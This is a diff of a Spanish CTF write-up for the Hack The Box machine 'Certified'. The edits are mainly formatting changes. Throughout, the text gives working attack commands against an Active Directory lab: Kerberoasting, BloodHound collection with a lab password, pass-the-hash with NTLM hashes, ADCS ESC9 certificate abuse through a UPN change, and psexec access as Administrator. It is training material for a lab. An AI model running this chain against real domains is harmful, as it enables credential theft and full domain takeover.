@@ -13,7 +13,7 @@ Se parte de un escenario de compromiso inicial (``assumed breach``) en el que se
 ![3](Images/3.png)
 ![4](Images/4.png)
 
-La combinación de servicios expuestos (Kerberos, LDAP, SMB, DNS) indica claramente que el objetivo actúa como DC dentro de un entorno Active Directory.
+La combinación de servicios expuestos (``Kerberos``, ``LDAP``, ``SMB``, ``DNS``) indica claramente que el objetivo actúa como DC dentro de un entorno Active Directory.
 
 Para comprobar la información recogida con ``nmap``:
 
@@ -22,6 +22,7 @@ Para comprobar la información recogida con ``nmap``:
 ![5](Images/5.png)
 
 Nombre de la máquina: ``DC01``
+
 Dominio: ``certified.htb``
 
 Se añade esta información al archivo ``/etc/hosts``:
@@ -34,20 +35,19 @@ Una técnica habitual cuando se dispone de credenciales válidas consiste en enu
 
 ![7](Images/7.png)
 
-Acto seguido, se realiza un tratamiento de los datos para generar un listado limpio de usuarios, algo potencialmente útil para futuras tareas de enumeración o ataques de autenticación.
+Acto seguido, se realiza un tratamiento de los datos para generar un diccionario de usuarios, algo potencialmente útil para futuras tareas de enumeración o ataques de autenticación.
 
 ``cat rpcusers.txt | cut -d '[' -f2 | cut -d ']' -f1 > users.txt; cat users.txt``
 
 ![8](Images/8.png)
 
-Para sincronizar con el DC: ``sudo ntpdate -u 10.10.11.41``
+Se sincroniza el reloj con el DC (``sudo ntpdate -u 10.10.11.41``) para evitar problemas relacionados con ``Kerberos`` y continuar con la enumeración de posibles vectores de ataque basados en este protocolo.
 
-Dado que se dispone de credenciales válidas de dominio, se sincroniza el reloj con el DC (``sudo ntpdate -u 10.10.11.41``) para evitar problemas relacionados con Kerberos y continuar con la enumeración de posibles vectores de ataque basados en este protocolo.
+Dado que se dispone de credenciales válidas de dominio:
 
+- Se comprueba la existencia de usuarios configurados con la opción `DONT_REQUIRE_PREAUTH`, susceptibles de ser explotados mediante ``AS-REP Roasting``, sin obtener resultados positivos.
 
-Se comprueba la existencia de usuarios configurados con la opción `DONT_REQUIRE_PREAUTH`, susceptibles de ser explotados mediante AS-REP Roasting, sin obtener resultados positivos.
-
-Asimismo, se identifica una cuenta asociada a un SPN, lo que permite solicitar su correspondiente TGS para evaluar la viabilidad de un ataque Kerberoasting:
+- Se identifica una cuenta asociada a un ``SPN``, lo que permite solicitar su correspondiente ``TGS`` para evaluar la viabilidad de un ataque ``Kerberoasting``:
 
 ``impacket-GetUserSPNs -request -dc-ip 10.10.11.41 certified.htb/judith.mader``
 
@@ -58,14 +58,14 @@ No se consigue romper con ``hashcat`` y rockyou como diccionario (``hashcat -m 1
 Para obtener una visión completa de las relaciones de permisos dentro del dominio se utiliza  ``BloodHound``:
 
 - Se levanta ``neo4j``: ``sudo neo4j start``
-- Se levanta BloodHound: ``bloodhound --no-sandbox &>/dev/null & disown``
+- Se levanta ``BloodHound``: ``bloodhound --no-sandbox &>/dev/null & disown``
 - Se introducen las credenciales para acceder al dashboard.
 
-- Se lanza el colector de BloodHound: ``bloodhound-python -u 'judith.mader' -p 'judith09' -d certified.htb -c all -ns 10.10.11.41``
+- Se lanza el colector de ``BloodHound``: ``bloodhound-python -u 'judith.mader' -p 'judith09' -d certified.htb -c all -ns 10.10.11.41``
 
 ![10](Images/10.png)
 
-- Una vez recolectada la data, se suben los archivos generados (``.json``) en el dashboard de BloodHound.
+- Una vez recolectada la data, se suben los archivos generados (``.json``) en el dashboard de ``BloodHound``.
 
  - Se comienza marcando como ``owned`` al usuario comprometido, ``judith.mader``, para comenzar el análisis de rutas de ataque.
 
@@ -220,14 +220,14 @@ Una vez dentro, en el escritorio del usuario comprometido (``C:\Users\management
 
 # PRIVESC
 
-Una vez se ha conseguido acceso a la máquina víctima, se continúa con el vector de escalado que previamente se enumeró desde BloodHound: el usuario ``management_svc`` tiene el privilegio ``GenericAll`` sobre el usuario ``ca_operator``. 
+Una vez se ha conseguido acceso a la máquina víctima, se continúa con el vector de escalado que previamente se enumeró desde ``BloodHound``: el usuario ``management_svc`` tiene el privilegio ``GenericAll`` sobre el usuario ``ca_operator``. 
 
 ![28](Images/28.png)
 
 Una de las formas más sencillas de explotar este privilegio consiste en modificar la contraseña del usuario víctima a una completamente arbitraria.
 
 
-Dado que no se conoce la contraseña del usuario ``management_svc``, pero sí su hash NTLM, se puede proceder haciendo uso, nuevamente, de [[Pass The Hash]].
+Dado que no se conoce la contraseña del usuario ``management_svc``, pero sí su hash NTLM, se puede proceder haciendo uso, nuevamente, de Pass The Hash.
 
 ![29](Images/29.png)
 
@@ -247,12 +247,12 @@ Si se comprueban las credenciales modificadas del usuario con ``netexec``:
 
 Tras verificar las nuevas credenciales del usuario comprometido, se continúa con la enumeración de ``ADCS`` mediante la herramienta ``certipy-ad`` para identificar configuraciones potencialmente vulnerables:
 
-``certipy find -vulnerable -username ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.10.11.41 -stdout``
+``certipy-ad find -vulnerable -username ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.10.11.41 -stdout``
 
 ![32](Images/32.png)
 ![33](Images/33.png)
 
-La salida revela una plantilla vulnerable (``CertifiedAuthentication``) emitida por ``certified-DC01-CA``. A su vez, ``certipy`` identifica el escenario como ``ESC9: Operator ca can enroll and template has no security extension``
+La salida revela una plantilla vulnerable (``CertifiedAuthentication``) emitida por ``certified-DC01-CA``. A su vez, ``certipy-ad`` identifica el escenario como ``ESC9: Operator ca can enroll and template has no security extension``
 
 La plantilla vulnerable no incluye la extensión de seguridad de objeto SID (``szOID_NTDS_CA_SECURITY_EXT``), una medida introducida por Microsoft para mitigar determinados abusos de mapeo de identidades en ``ADCS``.
 
@@ -260,11 +260,11 @@ Como consecuencia, durante el proceso de autenticación basado en certificados, 
 
 A su vez, dado que el usuario ``management_svc`` posee ``GenericAll`` sobre ``ca_operator``, es posible modificar temporalmente su ``UPN`` para hacerlo coincidir con ``Administrator``.
 
-O dicho con otras palabras, el ataque consiste en conseguir que una cuenta bajo nuestro control, modificando previamente su ``UPN``, obtenga un certificado cuya identidad indique ``Administrator``. Debido a la ausencia de la extensión SID en la plantilla vulnerable, AD asociará dicho certificado a la cuenta privilegiada (``Administrator``) durante el proceso de autenticación, lo que permitirá la extracción del hash NTLM del usuario ``Administrator`` real y posterior [[Pass The Hash]].
+O dicho con otras palabras, el ataque consiste en conseguir que una cuenta bajo nuestro control, modificando previamente su ``UPN``, obtenga un certificado cuya identidad indique ``Administrator``. Debido a la ausencia de la extensión SID en la plantilla vulnerable, AD asociará dicho certificado a la cuenta privilegiada (``Administrator``) durante el proceso de autenticación, lo que permitirá la extracción del hash NTLM del usuario ``Administrator`` real y posterior Pass The Hash.
 
 - 1: Se modifica temporalmente el ``UPN`` del usuario ``ca_operator``:
 
-``certipy account update -username management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator``
+``certipy-ad account update -username management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator``
 
 ![34](Images/34.png)
 
@@ -272,7 +272,7 @@ Aunque sigue siendo la misma cuenta de AD, ahora su ``UPN`` es ``Administrator``
 
 - 2: Una vez se ha modificado el UPN del usuario comprometido, se solicita un certificado del mismo utilizando la plantilla vulnerable: 
 
-``certipy req -username ca_operator@certified.htb -hashes :b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.10.11.41``
+``certipy-ad req -username ca_operator@certified.htb -hashes :b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.10.11.41``
 
 ![35](Images/35.png)
 
@@ -280,11 +280,11 @@ Debido a la configuración insegura de la plantilla, el certificado emitido cont
 
 - 3: Para minimizar el impacto sobre el entorno y evitar inconsistencias, se restaura el ``UPN`` original del usuario ``ca_operator``:
 
-``certipy account update -username management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb``
+``certipy-ad account update -username management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb``
 
 - 4: Finalmente, se utiliza el certificado obtenido para autenticarse como ``Administrator`` y conseguir su hash NTLM:
 
-``certipy auth -pfx administrator.pfx -domain certified.htb``
+``certipy-ad auth -pfx administrator.pfx -domain certified.htb``
 
 ![36](Images/36.png)
 
@@ -296,7 +296,7 @@ Se verifica la validez del hash con ``netexec``:
 
 ![37](Images/37.png)
 
-``Pwn3d!``, por lo que se utiliza ``psexec`` mediante [[Pass The Hash]] para acceder a la máquina víctima:
+``Pwn3d!``, por lo que se utiliza ``psexec`` mediante Pass The Hash para acceder a la máquina víctima:
 
 ``impacket-psexec Administrator@10.10.11.41 -hashes ':0d5b49608bbce1751f708748f67e2d34'``
 
